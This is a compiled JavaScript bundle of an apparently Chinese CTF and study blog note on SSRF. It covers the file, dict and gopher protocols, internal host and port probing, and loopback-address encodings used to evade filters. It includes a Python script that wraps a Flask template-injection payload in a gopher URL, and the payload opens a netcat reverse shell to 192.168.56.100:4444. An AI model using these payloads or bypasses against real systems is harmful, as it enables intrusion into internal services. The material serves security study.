(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{405:function(t,s,a){"use strict";a.r(s);var n=a(11),r=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"什么是ssrf攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#什么是ssrf攻击"}},[t._v("#")]),t._v(" 什么是SSRF攻击")]),t._v(" "),s("div",{staticClass:"custom-block tip"},[s("p",{staticClass:"custom-block-title"},[t._v("提示")]),t._v(" "),s("p",[t._v("SSRF(Server-Side Request Forgery,服务器请求伪造)是一种由攻击者构造请求,"),s("strong",[t._v("由服务端发起请求的安全漏洞")]),t._v(",一般情况下,SSRF攻击的目标是外网无法访问的内网系统")])]),t._v(" "),s("p",[t._v("简单讲，SSRF是利用了服务器发起了请求，绕过了对ip的限制。例如，攻击者与内网存在网络隔离，无法直接访问内网服务，在对外开放的主机上存在SSRF漏洞时，可以利用这台主机作为跳板，发起对内网服务的请求，从而达到访问内网服务的目的。")]),t._v(" "),s("h2",{attrs:{id:"常用协议"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#常用协议"}},[t._v("#")]),t._v(" 常用协议")]),t._v(" "),s("p",[t._v("在SSRF攻击中，可以搭配其他协议使用，例如：")]),t._v(" "),s("ul",[s("li",[t._v("SSRF + dict：扫描开放端口")]),t._v(" "),s("li",[t._v("SSRF + gopher：向内网服务发送各种请求")]),t._v(" "),s("li",[t._v("SSRF + file：读取本地文件")])]),t._v(" "),s("h2",{attrs:{id:"file协议"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#file协议"}},[t._v("#")]),t._v(" file协议")]),t._v(" "),s("p",[t._v("读取本地文件")]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/note-ssrf/1.png",alt:""}})]),t._v(" "),s("h2",{attrs:{id:"dict协议"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#dict协议"}},[t._v("#")]),t._v(" dict协议")]),t._v(" "),s("p",[s("a",{attrs:{href:"https://baike.baidu.com/item/DICT%E5%8D%8F%E8%AE%AE/349388",target:"_blank",rel:"noopener noreferrer"}},[t._v("百度百科 - DICT协议"),s("OutboundLink")],1)]),t._v(" "),s("blockquote",[s("p",[t._v("DICT协议因其端口探测特性，在网络安全场景中曾被用于SSRF攻击内网服务。")])]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/note-ssrf/2.png",alt:""}})]),t._v(" "),s("p",[t._v("利用：")]),t._v(" "),s("p",[t._v("1、探测内网存活主机")]),t._v(" "),s("p",[t._v("2、探测端口的开放情况和指纹信息")]),t._v(" "),s("h3",{attrs:{id:"探测存活主机"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#探测存活主机"}},[t._v("#")]),t._v(" 探测存活主机")]),t._v(" "),s("p",[t._v("通过连接时间判断主机是否存活，存活主机几乎会立即拒绝连接，而不存在的主机会有较长的超时等待时间。")]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/note-ssrf/3.png",alt:""}})]),t._v(" "),s("p",[t._v("使用burp suite的intruder模块进行测试存活主机，通过"),s("code",[t._v("接收到的响应")]),t._v("一列的时间判断主机是否存活")]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/note-ssrf/4.png",alt:""}})]),t._v(" "),s("h3",{attrs:{id:"扫描开放端口"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#扫描开放端口"}},[t._v("#")]),t._v(" 扫描开放端口")]),t._v(" "),s("p",[t._v("dict协议连接常见tcp协议端口时，会因为协议不兼容不匹配而返回错误信息，通过错误信息可以判断端口是否开放")]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/note-ssrf/6.png",alt:""}})]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/note-ssrf/5.png",alt:""}})]),t._v(" "),s("h2",{attrs:{id:"gopher协议-万能协议"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#gopher协议-万能协议"}},[t._v("#")]),t._v(" gopher协议（万能协议）")]),t._v(" "),s("p",[t._v("万能协议，可以构造各种协议请求发送给内网服务，例如http、redis、mysql、ftp等各种协议，简直就是内网穿梭的神")]),t._v(" "),s("p",[t._v("在一次打靶过程ssrf发起post请求打内网flask ssti的脚本")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" urllib"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("parse\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("build_gopher_post_request")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("host"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" port"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" path"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" headers"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[t._v('"""构造Gopher协议的POST请求"""')]),t._v("\n        http_request "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string-interpolation"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('f"POST ')]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("path"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v(' HTTP/1.1\\r\\n"')])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" key"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" value "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" headers"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("items"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        http_request "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string-interpolation"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('f"')]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("key"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v(": ")]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("value"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('\\r\\n"')])]),t._v("\n    \n    http_request "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\r\\n"')]),t._v("\n    http_request "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" data\n    \n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"=== 原始HTTP请求 ==="')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("repr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("http_request"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"="')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("50")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    \n    gopher_payload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" http_request"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\r\\n"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%0D%0A"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    gopher_payload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" urllib"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("parse"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("quote"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gopher_payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" safe"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    gopher_url "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string-interpolation"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('f"gopher://')]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("host"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("port"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("/_")]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("gopher_payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"')])]),t._v("\n    \n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" gopher_url\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 修正后的请求参数")]),t._v("\nhost "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"127.0.0.1"')]),t._v("\nport "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"2333"')]),t._v(" \npath "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/render"')]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 反弹shell")]),t._v("\ndata "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[t._v('"""{{url_for.__globals__.__builtins__[\'eval\'](\'__import__("os").popen("busybox nc 192.168.56.100 4444 -e bash").read()\')}}"""')]),t._v("\n\ncontent_length "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nheaders "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Host"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"127.0.0.1"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Content-Type"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"text/plain"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Content-Length"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("str")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("content_length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"=== 数据信息 ==="')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string-interpolation"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('f"数据内容: ')]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string-interpolation"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('f"数据长度: ')]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("content_length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v(' 字符"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\ngopher_url "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" build_gopher_post_request"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("host"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" port"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" path"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" headers"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"=== 生成的Gopher URL ==="')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string-interpolation"}},[s("span",{pre:!0,attrs:{class:"token string"}},[t._v('f"URL长度: ')]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gopher_url"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v(' 字符"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Gopher URL:"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gopher_url"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br"),s("span",{staticClass:"line-number"},[t._v("22")]),s("br"),s("span",{staticClass:"line-number"},[t._v("23")]),s("br"),s("span",{staticClass:"line-number"},[t._v("24")]),s("br"),s("span",{staticClass:"line-number"},[t._v("25")]),s("br"),s("span",{staticClass:"line-number"},[t._v("26")]),s("br"),s("span",{staticClass:"line-number"},[t._v("27")]),s("br"),s("span",{staticClass:"line-number"},[t._v("28")]),s("br"),s("span",{staticClass:"line-number"},[t._v("29")]),s("br"),s("span",{staticClass:"line-number"},[t._v("30")]),s("br"),s("span",{staticClass:"line-number"},[t._v("31")]),s("br"),s("span",{staticClass:"line-number"},[t._v("32")]),s("br"),s("span",{staticClass:"line-number"},[t._v("33")]),s("br"),s("span",{staticClass:"line-number"},[t._v("34")]),s("br"),s("span",{staticClass:"line-number"},[t._v("35")]),s("br"),s("span",{staticClass:"line-number"},[t._v("36")]),s("br"),s("span",{staticClass:"line-number"},[t._v("37")]),s("br"),s("span",{staticClass:"line-number"},[t._v("38")]),s("br"),s("span",{staticClass:"line-number"},[t._v("39")]),s("br"),s("span",{staticClass:"line-number"},[t._v("40")]),s("br"),s("span",{staticClass:"line-number"},[t._v("41")]),s("br"),s("span",{staticClass:"line-number"},[t._v("42")]),s("br"),s("span",{staticClass:"line-number"},[t._v("43")]),s("br"),s("span",{staticClass:"line-number"},[t._v("44")]),s("br"),s("span",{staticClass:"line-number"},[t._v("45")]),s("br"),s("span",{staticClass:"line-number"},[t._v("46")]),s("br")])]),s("h2",{attrs:{id:"内网ip地址"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#内网ip地址"}},[t._v("#")]),t._v(" 内网ip地址")]),t._v(" "),s("p",[t._v("在CTFshow靶场中，常见题目类型考察本地ip地址的利用")]),t._v(" "),s("p",[t._v("举例说明：")]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/ssrf0/2.png",alt:"flag"}})]),t._v(" "),s("p",[t._v("直接访问flag.php时会提示禁止本地用以外的用户访问，题目中的函数curl_exec()函数会请求目标url，此时的请求是由服务器发起的，可以利用"),s("code",[t._v("gopher")]),t._v("协议ssrf打内网服务")]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/ssrf0/3.png",alt:"url"}})]),t._v(" "),s("p",[t._v("实际利用场景可以学习B站橙子科技陈腾老师"),s("a",{attrs:{href:"https://space.bilibili.com/271803648/video",target:"_blank",rel:"noopener noreferrer"}},[t._v("使用SSRF对组件利用"),s("OutboundLink")],1)]),t._v(" "),s("p",[s("img",{attrs:{src:"/medias/ssrf0/1.png",alt:"ssrf"}})]),t._v(" "),s("h2",{attrs:{id:"本地ip地址的各种进制"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#本地ip地址的各种进制"}},[t._v("#")]),t._v(" 本地IP地址的各种进制")]),t._v(" "),s("h3",{attrs:{id:"默认"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#默认"}},[t._v("#")]),t._v(" 默认")]),t._v(" "),s("p",[t._v("http://127.0.0.1")]),t._v(" "),s("h3",{attrs:{id:"_16进制"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_16进制"}},[t._v("#")]),t._v(" 16进制")]),t._v(" "),s("p",[t._v("http://0x7F000001")]),t._v(" "),s("h3",{attrs:{id:"_10进制"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_10进制"}},[t._v("#")]),t._v(" 10进制")]),t._v(" "),s("p",[t._v("((127*256+0)*256+0)*256+1 //计算过程")]),t._v(" "),s("p",[t._v("http://2130706433")]),t._v(" "),s("h3",{attrs:{id:"_8进制"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_8进制"}},[t._v("#")]),t._v(" 8进制")]),t._v(" "),s("p",[t._v("url=http://0177.0000.0000.0001/flag.php  //八进制")]),t._v(" "),s("p",[t._v("url=http://0177.0.0.1/flag.php")]),t._v(" "),s("h3",{attrs:{id:"_0"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0"}},[t._v("#")]),t._v(" 0")]),t._v(" "),s("div",{staticClass:"language-plaintext line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plaintext"}},[s("code",[t._v("url=http://127.1/flag.php\nurl=http://0/flag.php          //0在linux系统中会解析成127.0.0.1，在windows中解析成0.0.0.0失败\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br")])]),s("p",[t._v("0.0.0.0表示任何IP地址，也可以表示本地")]),t._v(" "),s("p",[t._v("http://0.0.0.0")]),t._v(" "),s("p",[t._v("http://0.0.0")]),t._v(" "),s("p",[t._v("http://0.0")]),t._v(" "),s("p",[t._v("http://0")]),t._v(" "),s("h2",{attrs:{id:"域名解析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#域名解析"}},[t._v("#")]),t._v(" 域名解析")]),t._v(" "),s("p",[t._v("域名dns解析到127.0.0.1，例如sudo.cc")]),t._v(" "),s("p",[s("a",{attrs:{href:"https://lock.cmpxchg8b.com/rebinder.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("dns重绑工具"),s("OutboundLink")],1)])])}),[],!1,null,null,null);s.default=r.exports}}]);